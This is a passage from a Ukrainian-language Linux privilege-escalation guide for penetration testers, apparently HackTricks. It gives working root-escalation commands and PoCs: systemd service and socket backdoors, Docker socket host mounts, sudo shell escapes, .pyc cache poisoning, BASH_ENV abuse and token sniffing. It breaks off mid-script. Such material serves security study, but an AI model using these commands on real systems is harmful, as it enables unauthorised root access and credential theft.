Щоб виявити такий тип прихованого запису, перевірте файли cron за допомогою інструментів, які відображають керівні символи:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Служби

### Файли _.service_ із правом запису

Перевірте, чи можете ви записувати дані в будь-який файл `.service`. Якщо так, ви **можете змінити його**, щоб він **виконував** ваш **backdoor, коли** службу **запускають**, **перезапускають** або **зупиняють** (можливо, доведеться чекати, доки комп’ютер перезавантажать).\
Наприклад, створіть свій backdoor у файлі .service за допомогою **`ExecStart=/tmp/script.sh`**

### Виконувані файли служб із правом запису

Майте на увазі: якщо ви маєте **дозвіл на запис до виконуваних файлів, які запускають служби**, ви можете замінити їх на backdoor, щоб під час повторного запуску служб виконувалися backdoor.

### PATH systemd — відносні шляхи

Переглянути PATH, який використовує **systemd**, можна за допомогою:

```bash
systemctl show-environment
```

Якщо ви виявите, що можете **записувати** в будь-яку з папок у шляху, можливо, вам вдасться **escalate privileges**. Потрібно шукати **відносні шляхи**, які використовуються у файлах конфігурації служб, наприклад:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Потім створіть **виконуваний файл** із **такою самою назвою, як у бінарного файла за відносним шляхом**, у доступній для запису папці systemd PATH. Коли службі накажуть виконати вразливу дію (**Start**, **Stop**, **Reload**), буде виконано ваш **backdoor** (непривілейовані користувачі зазвичай не можуть запускати й зупиняти служби, але перевірте, чи можете скористатися `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це файли модулів systemd, назви яких закінчуються на `**.timer**` і які керують файлами `**.service**` або подіями. **Таймери** можна використовувати як альтернативу cron: вони мають вбудовану підтримку календарних і монотонних подій часу та можуть виконуватися асинхронно.

Перелічити всі таймери можна так:

```bash
systemctl list-timers --all
```

### Таймери, доступні для запису

Якщо ви можете змінити таймер, то можете змусити його виконати деякі сутності systemd.unit (наприклад, `.service` або `.target`).

```bash
Unit=backdoor.service
```

У документації можна прочитати, що таке Unit:

> Unit, який потрібно активувати після спрацювання цього таймера. Аргументом є назва unit без суфікса «.timer». Якщо значення не вказано, за замовчуванням активується service з тією самою назвою, що й timer unit, але без суфікса. (Див. вище.) Рекомендується, щоб назви unit, який активується, і timer unit були однаковими, за винятком суфікса.

Отже, щоб скористатися цим дозволом, потрібно:

- Знайти systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти systemd unit, який **виконує відносний шлях**, і мати **права на запис до systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root. Виконайте:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Зверніть увагу: **таймер** **активується** створенням символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **взаємодію процесів** на тій самій або різних машинах у моделях клієнт-сервер. Вони використовують стандартні файли дескрипторів Unix для взаємодії між комп’ютерами та налаштовуються за допомогою файлів `.socket`.<sup>[[14]](#references)</sup>

Сокети можна налаштувати за допомогою файлів `.socket`.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці параметри різні, але загалом вони **вказують, де сокет очікуватиме на з’єднання** (шлях до файла сокета AF_UNIX, адреса IPv4/6 та/або номер порту, на якому потрібно очікувати тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, для кожного **вхідного з’єднання запускається екземпляр служби**, якому передається лише сокет з’єднання. Якщо **false**, усі сокети, що очікують на з’єднання, **передаються запущеному модулю служби**, а для всіх з’єднань запускається лише один модуль служби. Це значення ігнорується для сокетів дейтаграм і FIFO, де один модуль служби безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони лише так, щоб вони працювали з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або кілька командних рядків, які **виконуються до** або **після** створення та прив’язування сокетів/FIFO, що очікують на з’єднання. Першим токеном командного рядка має бути абсолютний шлях до файла, за яким ідуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення сокетів/FIFO, що очікують на з’єднання.
- `Service`: Вказує назву модуля **служби, який потрібно активувати** у разі **вхідного трафіку**. Це налаштування дозволене лише для сокетів із `Accept=no`. За замовчуванням використовується служба з такою самою назвою, як у сокета (із заміною суфікса). У більшості випадків використовувати цей параметр не потрібно.

### Файли .socket із правом запису

Якщо ви знайдете файл `.socket` із **правом запису**, можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, і backdoor запускатиметься перед створенням сокета. Тому вам, **імовірно, доведеться чекати перезавантаження машини.**\
_Зверніть увагу: система має використовувати конфігурацію цього файла сокета, інакше backdoor не буде запущено._

### Активація сокета + шлях до модуля із правом запису (створення відсутньої служби)

Ще одна серйозна помилка конфігурації:

- модуль сокета з `Accept=no` і `Service=<name>.service`
- зазначений модуль служби відсутній
- зловмисник може записувати в `/etc/systemd/system` (або інший шлях пошуку модулів)

У такому разі зловмисник може створити `<name>.service`, а потім надіслати трафік до сокета, щоб systemd завантажив і запустив нову службу від імені root.

Короткий алгоритм:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Сокети, доступні для запису

Якщо ви **виявите сокет, доступний для запису** (_тут ідеться про Unix-сокети, а не про файли конфігурації `.socket`_), тоді **ви можете взаємодіяти** з цим сокетом і, можливо, експлуатувати вразливість.

### Перелік Unix-сокетів

```bash
netstat -a -p --unix
```

### Необроблене з’єднання

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Приклад експлуатації:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-сокети

Зверніть увагу, що можуть бути **сокети, які прослуховують HTTP-запити** (_я говорю не про файли .socket, а про файли, що діють як Unix-сокети_). Це можна перевірити так:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Якщо сокет **відповідає на HTTP**-запит, ви можете **взаємодіяти** з ним і, можливо, **експлуатувати вразливість**.

### Записуваний сокет Docker

Сокет Docker, який часто розташований за адресою `/var/run/docker.sock`, — це критично важливий файл, який слід захистити. За замовчуванням він доступний для запису користувачу `root` і учасникам групи `docker`. Наявність доступу на запис до цього сокета може призвести до підвищення привілеїв. Нижче наведено опис цього способу та альтернативні методи на випадок, якщо Docker CLI недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є доступ на запис до сокета Docker, ви можете підвищити привілеї за допомогою таких команд:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ці команди дають змогу запустити контейнер із доступом root до файлової системи хоста.

#### **Використання Docker API напряму**

Якщо Docker CLI недоступний, сокетом Docker усе одно можна зловживати, надсилаючи звичайні HTTP-запити через Unix-сокет. Найнадійніший спосіб:

- створити довготривалий допоміжний контейнер із bind-монтуванням кореневої файлової системи хоста
- запустити його
- створити екземпляр `exec` усередині цього контейнера
- запустити екземпляр `exec` і отримати вивід через API

**Перелік образів Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Створіть і запустіть допоміжний контейнер**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Створіть екземпляр exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Запустіть екземпляр exec і прочитайте вивід**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Цей шаблон зазвичай надійніший, ніж спроби вручну керувати `attach` за допомогою `socat` або `nc -U`. Щойно ви зможете створити допоміжний контейнер із `/:/host`, можна використовувати додаткові екземпляри `exec`, щоб читати файли, як-от `/host/root/...`, додавати SSH-ключі до `/host/root/.ssh` або змінювати файли запуску хоста.

### Інше

Зверніть увагу: якщо ви маєте права на запис до сокета docker, оскільки **входите до групи `docker`**, у вас є [**більше способів підвищити привілеї**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Якщо [**API docker прослуховує порт**, ви також можете скомпрометувати його](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **інші способи вийти з контейнерів або зловживати середовищами виконання контейнерів для підвищення привілеїв** у:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Підвищення привілеїв через Containerd (ctr)

Якщо ви виявили, що можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Підвищення привілеїв через **RunC**

Якщо ви виявили, що можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **можливо, ви зможете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесної взаємодії (IPC)**, яка дає змогу програмам ефективно взаємодіяти й обмінюватися даними. Розроблена з урахуванням сучасних систем Linux, вона пропонує надійну інфраструктуру для різних форм взаємодії програм.<sup>[[16]](#references)</sup>

Ця система універсальна: вона підтримує базову IPC, що спрощує обмін даними між процесами й нагадує **розширені доменні сокети UNIX**. Крім того, вона допомагає транслювати події або сигнали, забезпечуючи безперешкодну взаємодію компонентів системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може спонукати музичний програвач вимкнути звук, покращуючи користувацький досвід. Також D-Bus підтримує систему віддалених об’єктів, що спрощує надсилання запитів до служб і виклики методів між програмами та оптимізує процеси, які раніше були складними.

D-Bus працює за **моделлю дозволу/заборони**, керуючи дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупної дії правил політик, що збігаються. Ці політики визначають взаємодію з шиною та потенційно можуть дозволити підвищення привілеїв через зловживання цими дозволами.

Нижче наведено приклад такої політики з `/etc/dbus-1/system.d/wpa_supplicant.conf`, у якій описано дозволи для користувача root володіти `fi.w1.wpa_supplicant1`, надсилати йому повідомлення та отримувати від нього повідомлення.

Політики без зазначеного користувача або групи застосовуються до всіх, а політики контексту «default» — до всіх, на кого не поширюються інші конкретні політики.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Дізнайтеся тут, як виконувати enumeration та exploit комунікації D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво виконати enumeration мережі й з’ясувати розташування машини.

### Загальний enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Якщо активний запис `/etc/inetd.conf` запускає GNU Inetutils `telnetd` від root, перевірте налаштовану версію бінарного файла й локальний listener, навіть якщо порт прослуховує лише loopback. У GNU Inetutils версій від 1.9.3 до 2.7 була [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89), через яку переданий клієнтом `USER` потрапляв до `login -f` (CVE-2026-24061). Процес або рядок версії є індикатором; перш ніж вважати систему вразливою, перевірте наявність виправлення від постачальника та фактичний daemon. Докладніше — у [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md).

### Швидке первинне сортування фільтрації вихідного трафіку

Якщо хост може виконувати команди, але зворотні підключення не працюють, швидко розрізніть фільтрацію DNS, транспортного рівня, proxy та маршрутів:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Відкриті порти

Завжди перевіряйте мережеві служби, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу до неї:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Класифікуйте слухачів за адресою прив’язки:

- `0.0.0.0` / `[::]`: доступні на всіх локальних інтерфейсах.
- `127.0.0.1` / `::1`: доступні лише локально (хороші кандидати для тунелювання/перенаправлення).
- Конкретні внутрішні IP-адреси (наприклад, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Робочий процес первинної перевірки локально доступних сервісів

Коли ви компрометуєте вузол, сервіси, прив’язані до `127.0.0.1`, часто вперше стають доступними з вашої оболонки. Ось швидкий локальний робочий процес:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS як мережевий сканер (режим лише для мережі)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований мережевий сканер. Він використовує доступні бінарні файли з `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює інструменти.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

If you pass `-d`, `-p`, or `-i` without `-t`, linPEAS працює як звичайний мережевий сканер (пропускаючи решту перевірок на підвищення привілеїв).

### Sniffing

Перевірте, чи можете ви перехоплювати мережевий трафік. Якщо так, то, можливо, вам вдасться отримати облікові дані.

```
timeout 1 tcpdump
```

Швидкі практичні перевірки:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) особливо цінний під час post-exploitation, оскільки багато сервісів, доступних лише зсередини, розкривають там токени/куки/облікові дані:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Захоплюйте зараз, аналізуйте пізніше:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Користувачі

### Загальне перерахування

Перевірте, **ким** ви є, які **привілеї** маєте, які **користувачі** є в системах, хто з них може **login**, а хто має **привілеї root**:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Великий UID

Деякі версії Linux були вразливі до помилки, яка дозволяє користувачам із **UID > INT_MAX** підвищувати привілеї. Докладніше: [тут](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [тут](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [тут](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Скористайтеся експлойтом** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви **член групи**, яка може надати привілеї root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є щось цікаве в буфері обміну (якщо це можливо)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Політика паролів

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Відомі паролі

Якщо вам **відомий будь-який пароль** у середовищі, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо ви не проти створити багато шуму, а на комп’ютері є бінарні файли `su` і `timeout`, можна спробувати brute-force користувачів за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається виконати brute-force користувачів.

## Зловживання writable PATH

### $PATH

Якщо ви виявите, що можете **записувати файли в якусь папку з $PATH**, то, можливо, зможете підвищити привілеї, **створивши backdoor у папці, доступній для запису**, з назвою якоїсь команди, що виконуватиметься іншим користувачем (бажано root) і **не завантажується з папки, розташованої раніше у $PATH за вашу папку з доступом для запису**.

### SUDO і SUID

Можливо, вам дозволено виконувати певні команди за допомогою sudo або для них установлено біт suid. Перевірте це за допомогою:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Деякі **неочікувані команди дають змогу читати та/або записувати файли чи навіть виконувати команду**.<sup>[[8]](#references)</sup> Наприклад:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певні команди з привілеями іншого користувача, не знаючи його пароля.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

У цьому прикладі користувач `demo` може запускати `vim` від імені `root`; тепер отримати shell дуже просто: достатньо додати SSH-ключ до каталогу root або викликати `sh`.

```
sudo vim -c '!sh'
```

### Невзяте в лапки порівняння Bash у sudo-скрипті

У Bash права частина `[[ "$protected" == $candidate ]]` є шаблоном. Якщо root-capable sudo-скрипт заповнює `candidate` зі контрольованого викликачем файлу, значення на кшталт `prefix*` може збігатися з початком захищеного рядка. Різні шляхи успішного виконання та помилок можуть у такому разі розкрити oracle префікса. Візьміть праву частину в лапки (`[[ "$protected" == "$candidate" ]]`), якщо потрібна точна рівність. Перш ніж вважати невзяте в лапки порівняння експлуатованим, перевірте фактичні аргументи sudo, походження вхідних даних і поведінку гілок, яку можна спостерігати. [Посібник GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) описує таку поведінку шаблонів.

### Файли проєктів PrusaSlicer із sudo

Необмежений дозвіл sudo на запуск `prusaslicer` або `prusa-slicer` із правами root потребує перевірки, якщо викликач може вибирати проєкт `.3mf` для нарізання. Проєкт може містити скрипт постобробки, який запускається під час експорту G-code; спеціально створені проєкти могли виконувати команди в PrusaSlicer аж до версії 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Перш ніж робити висновок, що межу привілеїв можна перетнути, перевірте чинне правило sudo, версію бінарного файла та виправлення постачальника, джерело проєкту й те, чи запускається відповідний шлях експорту. Фіксований аргумент проєкту або чинна політика `NOEXEC` можуть змінити результат. Сам факт наявності встановленого слайсера не доводить наявність шляху підвищення привілеїв.

### SETENV

Ця директива дозволяє користувачеві **встановлювати змінну середовища** під час виконання команди:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Цей приклад, **заснований на машині Admirer з HTB**, був **вразливим** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну бібліотеку Python під час виконання скрипту від імені root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Отруєння доступного для запису `__pycache__` / `.pyc` під час імпорту Python-модулів, дозволеного через sudo

Якщо **Python-скрипт, запуск якого дозволено через sudo**, імпортує модуль із каталогу пакета, що містить **доступний для запису `__pycache__`**, ви можете замінити кешований `.pyc` і виконати код від імені привілейованого користувача під час наступного імпорту.<sup>[[30]](#references)</sup>

- Чому це працює:
  - CPython зберігає кеш байткоду в `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Інтерпретатор перевіряє **заголовок** (магічне число + метадані часової мітки/хешу, пов’язані з вихідним кодом), а потім виконує об’єкт коду у форматі marshal, збережений після цього заголовка.
  - Якщо ви можете **видалити й створити заново** кешований файл, оскільки каталог доступний для запису, `.pyc`, яким володіє root і який не доступний для запису, усе одно можна замінити.
- Типовий шлях:
  - `sudo -l` показує Python-скрипт або обгортку, яку можна запустити від імені root.
  - Цей скрипт імпортує локальний модуль із `/opt/app/`, `/usr/local/lib/...` тощо.
  - Каталог `__pycache__` імпортованого модуля доступний для запису вашому користувачеві або всім користувачам.

Швидке перерахування:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Якщо ви можете переглянути привілейований скрипт, визначте імпортовані модулі та шлях до кешу:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Сценарій зловживання:

1. Один раз запустіть скрипт, дозволений через sudo, щоб Python створив легітимний файл кешу, якщо його ще немає.
2. Прочитайте перші 16 байтів із легітимного `.pyc` і використайте їх у підміненому файлі.
3. Скомпілюйте об’єкт коду з payload, виконайте `marshal.dumps(...)`, видаліть оригінальний файл кешу й створіть його заново з оригінальним заголовком і вашим шкідливим байткодом.
4. Повторно запустіть скрипт, дозволений через sudo, щоб імпорт виконав ваш payload від імені root.

Важливі примітки:

- Повторне використання оригінального заголовка є ключовим, оскільки Python перевіряє метадані кешу за вихідним файлом, а не те, чи відповідає тіло байткоду вихідному файлу.
- Це особливо корисно, коли вихідний файл належить root і недоступний для запису, але до каталогу `__pycache__`, у якому він міститься, можна записувати.
- `PYTHONDONTWRITEBYTECODE=1` і `python -B` забороняють Python записувати нові файли `.pyc`; вони **не** забороняють завантажувати вже наявний кеш, який зловмисник підмінив. Критична межа — чи може користувач із нижчими привілеями підмінити кеш, який привілейований імпорт прийме. Перед завантаженням кешованого байткоду Python перевіряє метадані часової мітки/розміру або хешу. Див. [довідник з імпорту Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) і [документацію командного рядка](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Мінімальна структура proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Посилення захисту:

- Переконайтеся, що каталоги в привілейованому шляху імпорту Python, зокрема `__pycache__`, недоступні для запису користувачам із низькими привілеями.
- Перевірте власника й дозволи каталогів кешу, зокрема наявних файлів `.pyc`. Вимкнення запису байткоду може зменшити створення нових кешів, але не захищає наявний кеш, який можна підмінити.
- Ставтеся до локальних модулів Python і каталогів кешу, доступних для запису, так само, як до скриптів оболонки чи спільних бібліотек, доступних для запису й виконуваних від root.

### BASH_ENV, збережений через sudo env_keep → оболонка root

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), можна скористатися поведінкою Bash під час запуску неінтерактивної оболонки, щоб виконати довільний код від root, викликавши дозволену команду.<sup>[[24]](#references)</sup>

- Чому це працює: для неінтерактивних оболонок Bash обчислює `$BASH_ENV` і підключає цей файл перед запуском цільового скрипту. Багато правил sudo дозволяють запускати скрипт або обгортку оболонки. Якщо `BASH_ENV` зберігається sudo, ваш файл підключається з привілеями root.<sup>[[23]](#references)</sup>

- Вимоги:
  - Правило sudo, яке можна використати (будь-яка ціль, що неінтерактивно запускає `/bin/bash`, або будь-який bash-скрипт).
  - `BASH_ENV` зазначено в `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Посилення захисту:
  - Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
  - Не використовуйте shell-обгортки для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
  - Розгляньте можливість увімкнути журналювання I/O у sudo та сповіщення про використання збережених змінних середовища.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo дозволяє запускати Terraform від імені користувача з вищими привілеями, `!env_reset` — це підказка перевірити, які саме змінні середовища зберігаються для цього правила. Перш ніж вважати доступний для запису викликачем `.terraformrc` або `terraform.rc` активною конфігурацією CLI, переконайтеся, яким є ефективне значення `HOME` або `TF_CLI_CONFIG_FILE`. Запис `provider_installation.dev_overrides` має значення лише тоді, коли фіксована команда Terraform завантажує цей провайдер, а викликач може розмістити його виконуваний файл у вибраному каталозі.<sup>[[25]](#references)</sup>

- Спрямуйте потрібний провайдер у каталог, доступний для запису, і розмістіть там шкідливий плагін із назвою провайдера (наприклад, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
